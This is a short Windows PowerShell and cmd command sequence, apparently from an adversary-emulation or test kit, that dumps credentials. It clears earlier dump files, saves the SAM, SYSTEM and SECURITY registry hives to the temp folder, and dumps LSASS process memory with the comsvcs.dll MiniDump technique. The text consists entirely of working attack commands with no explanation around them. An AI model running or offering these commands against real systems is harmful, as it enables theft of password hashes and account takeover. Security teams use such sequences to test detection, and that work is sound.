Remove-Item $env:TEMP\mimihash.txt, $env:TEMP\lsass.dmp, $env:TEMP\SAM.dmp, $env:TEMP\SYSTEM.dmp, $env:TEMP\SECURITY.dmp -ErrorAction SilentlyContinue
cmd.exe /c "reg.exe save hklm\security %TEMP%\SECURITY.dmp & reg.exe save hklm\system %TEMP%\SYSTEM.dmp & reg.exe save hklm\sam %TEMP%\SAM.dmp"
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
